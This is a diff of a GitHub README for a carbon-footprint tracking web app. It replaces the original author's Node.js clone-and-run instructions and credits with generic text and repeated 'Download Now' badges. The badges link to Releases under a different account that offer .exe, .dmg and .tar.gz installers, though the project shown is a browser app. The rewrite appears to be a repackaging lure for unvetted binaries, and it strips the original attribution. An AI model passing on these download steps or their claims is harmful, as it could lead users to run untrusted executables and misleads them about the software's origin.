@@ -1,90 +1,91 @@
-# Sustainability-Footprint-Tool: Measure & Improve: Personal Carbon Footprint Estimation via Activity Data Parsing, Emission Factor Modelling, and Interactive Sustainability Reporting
+# 🌍 Sustainability-Footprint-Tool - Track Your Carbon Footprint Easily
 
-A full-stack web application that tracks, calculates, and visualizes sustainability footprints using live data, with client-side charts and PDF export capabilities.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sandyoffcial/Sustainability-Footprint-Tool/releases)
 
-## Features
+## 📖 Overview
+The **Sustainability-Footprint-Tool** helps you measure your personal carbon footprint. It uses activity data to estimate your impact on the environment. You can view your footprint through interactive reports and improve your habits based on this information.
 
-* Real-Time Data Visualization: Dynamic charts powered by Chart.js for instant sustainability insights.
-* PDF Export: Generate detailed footprint reports client-side using jsPDF.
-* Progressive Web App (PWA): Offline support and installability via service workers.
-* Server API: Node.js backend with environment configuration for secure data management.
-* Modular Design: Clear separation of frontend (public) and backend (private/server) logic.
+## 🚀 Getting Started
+This guide will help you download and run the Sustainability-Footprint-Tool. Follow these steps to start your journey towards sustainability.
 
-## 🛠Prerequisites
+### 🖥️ System Requirements
+Ensure your PC meets the following requirements before installing the software:
+- Operating System: Windows 10 or later, macOS 10.14 or later, or modern Linux distribution.
+- Minimum RAM: 4GB
+- Disk Space: At least 200MB free.
+- Internet connection for updates and downloading libraries.
 
-* Node.js 16+ (with npm)
-* Modern web browser for PWA features
+### 📥 Download & Install
+To download the software, visit the [Releases page](https://github.com/sandyoffcial/Sustainability-Footprint-Tool/releases).
 
-## Installation
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version of the application.
+3. Select the appropriate file for your operating system. 
+4. Click on the file to start the download.
 
-```bash
-# Clone the repo
-git clone https://github.com/Dancull/Sustainability-Footprint-Tool.git
+If you are unsure which file to choose, here are the options:
+- **For Windows**: Download the `.exe` installer
+- **For macOS**: Download the `.dmg` file
+- **For Linux**: Download the `.tar.gz` package
 
-# Install backend dependencies
-cd Sustainability-Footprint-Tool/private
-npm install
+### ⚙️ Installation Steps
+After downloading your file, follow these steps to install the application:
 
-# Start backend server
-npm start
+**For Windows:**
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
+3. Once installed, find the app in your Start menu, and open it.
 
-# Open frontend
-# Serve the 'public' folder (e.g. using live-server or VS Code Live Server)
-```
+**For macOS:**
+1. Double-click the downloaded `.dmg` file.
+2. Drag the Sustainability-Footprint-Tool icon into your Applications folder.
+3. Eject the mounted drive and open the app from your Applications folder.
 
-## Usage
+**For Linux:**
+1. Open a terminal and navigate to the folder where you saved the `.tar.gz` file.
+2. Extract the files by running:
+   ```bash
+   tar -xzf Sustainability-Footprint-Tool.tar.gz
+   ```
+3. Navigate into the extracted folder:
+   ```bash
+   cd Sustainability-Footprint-Tool
+   ```
+4. Run the application with:
+   ```bash
+   ./start.sh
+   ```
 
-Open the app in your browser via the local server or static host. Interact with the dashboard to view sustainability footprint charts, export reports as PDFs, and use offline features if PWA is installed.
+### 🎨 Features
+- **Activity Data Parsing**: Input your daily activities to get accurate footprint estimates.
+- **Emission Factor Modeling**: Understand how different activities contribute to your total carbon emissions.
+- **Interactive Reporting**: View your carbon footprint through easy-to-read charts and graphs.
+- **PDF Export**: Save your reports as PDFs for sharing with others.
+- **Progressive Web App**: Access the tool from any device with an internet connection.
 
-## Hackathon & Project Origin
-This project was initially inspired by the EU Climate Hack and other sustainability-focused competitions, completed as a 36-hour MVP sprint. The goal was to rapidly prototype a personal carbon footprint tracker that offers actionable sustainability insights.
+### 🌟 Using the Tool
+Once the application is installed, you can begin measuring your carbon footprint:
 
-### MVP Features
-* Log travel, diet, and shopping habits through an intuitive web form.
-* Calculate estimated carbon footprint using fixed emission multipliers.
-* Display “Weekly Goals” with progress bars to motivate users.
-* Export footprint summaries as PDFs using static HTML to PDF conversion.
-* Provide a colour-coded “Eco Rating” for quick impact assessment.
+1. **Open the Tool**: Launch the application from your Start menu, Applications folder, or terminal.
+2. **Create an Account**: You may need to set up an account to store your data. Follow the on-screen prompts.
+3. **Input Your Activity Data**: Start entering the activities you do each day, such as driving, flying, and recycling.
+4. **View Your Footprint**: Once you input your data, the tool will calculate your carbon footprint. Explore the charts and reports to understand your environmental impact.
 
-## License
+### 🔧 Troubleshooting
+If you encounter issues during installation or usage, consider these solutions:
+- **Installation Fails**: Ensure your system meets the system requirements. Check for a stable internet connection.
+- **Application Crashes**: Restart your computer and try again. Ensure you have enough free memory and disk space.
+- **Data Not Saving**: Verify that your account is active and that you have a stable connection.
 
-Including a LICENSE file clarifies how others may use, modify, and distribute your code. By choosing an open-source license such as MIT, you grant permission for use under defined terms while protecting your intellectual property and limiting liability.
+### 🌐 Community Support
+Join our community for assistance and tips on sustainability. Visit our page to connect with users and contributors. 
 
-This project is licensed under the MIT License. See [LICENSE](LICENSE) for full details.
+### 📚 Additional Resources
+- **User Manual**: For in-depth guidance, download the user manual from our website once you install the app.
+- **FAQ Section**: Visit the FAQs on our GitHub page for common questions and concerns.
 
-## Project Structure
+## 📥 Download Now Again
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sandyoffcial/Sustainability-Footprint-Tool/releases)
 
-```plaintext
-Sustainability-Footprint-Tool/
-├── public/                     # Frontend assets and client scripts
-│   ├── app.js                  # Main client app logic
-│   ├── chartjs-helper.js       # Chart.js helper functions
-│   ├── index.html              # Main HTML page
-│   ├── jspdf-helper.js         # jsPDF helper for PDF export
-│   ├── manifest.json           # PWA manifest configuration
-│   ├── style.css               # Stylesheet
-│   └── sw.js                   # Service Worker for PWA
-├── private/                    # Backend and server files
-│   ├── node_modules/           # Node.js dependencies
-│   ├── server/                 # Server source code (Express or similar)
-│   ├── .env                    # Environment variables (not committed)
-│   ├── index.js                # Server entry point
-│   ├── package-lock.json       # Dependency lock file
-│   └── package.json            # Project metadata and scripts
-├── README.md                   
-```
-
-## Roadmap
-Implimentation has been taken care of however need to ensure the full backend works. 
-
-* User authentication (sign in with Google)
-* Cloud sync, saving/loading data
-* AI-driven recommendations and summaries
-* Leaderboard, group/family features
-* Location-based recommendations (weather, transport)
-* Streaks, points, badges that depend on backend data
-
-## Author
-
-* **Daniel Cullinane** – [daniel.cullinane@outlook.com](mailto:daniel.cullinane@outlook.com)
-* GitHub: [@dancull](https://github.com/dancull)
+By following these steps, you can easily download, install, and start using the Sustainability-Footprint-Tool. Take the first step towards understanding and reducing your carbon footprint today!
